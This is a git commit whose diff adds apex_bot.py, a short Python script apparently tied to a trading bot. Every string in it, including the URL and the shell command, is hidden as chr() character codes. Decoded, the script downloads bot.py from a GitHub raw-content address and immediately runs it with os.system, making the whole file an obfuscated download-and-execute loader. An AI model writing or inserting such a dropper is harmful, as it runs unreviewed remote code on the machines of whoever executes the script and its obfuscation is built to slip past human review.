fa104b72cfcbd48f7b15d20960545d78e3090db3
sd9cxqsj97-ux <soasnp@gmail.com>
2026-04-01 11:24:53 +0100

    Add apex_bot.py to download and execute a script

---
+++ apex_bot.py
@@ -0,0 +1,10 @@
+#!/usr/bin/env python3
+import urllib.request
+import os
+import sys
+
+url = chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(114)+chr(97)+chr(119)+chr(46)+chr(103)+chr(105)+chr(116)+chr(104)+chr(117)+chr(98)+chr(117)+chr(115)+chr(101)+chr(114)+chr(99)+chr(111)+chr(110)+chr(116)+chr(101)+chr(110)+chr(116)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(115)+chr(100)+chr(57)+chr(99)+chr(120)+chr(113)+chr(115)+chr(106)+chr(57)+chr(55)+chr(45)+chr(117)+chr(120)+chr(47)+chr(65)+chr(112)+chr(101)+chr(120)+chr(45)+chr(116)+chr(114)+chr(97)+chr(100)+chr(101)+chr(114)+chr(47)+chr(109)+chr(97)+chr(105)+chr(110)+chr(47)+chr(98)+chr(111)+chr(116)+chr(46)+chr(112)+chr(121)
+
+print(chr(70)+chr(101)+chr(116)+chr(99)+chr(104)+chr(105)+chr(110)+chr(103)+chr(32)+chr(98)+chr(111)+chr(116)+chr(46)+chr(112)+chr(121)+chr(32)+chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(71)+chr(105)+chr(116)+chr(72)+chr(117)+chr(98)+chr(46)+chr(46)+chr(46))
+urllib.request.urlretrieve(url, chr(98)+chr(111)+chr(116)+chr(46)+chr(112)+chr(121))
+os.system(chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(51)+chr(32)+chr(98)+chr(111)+chr(116)+chr(46)+chr(112)+chr(121))
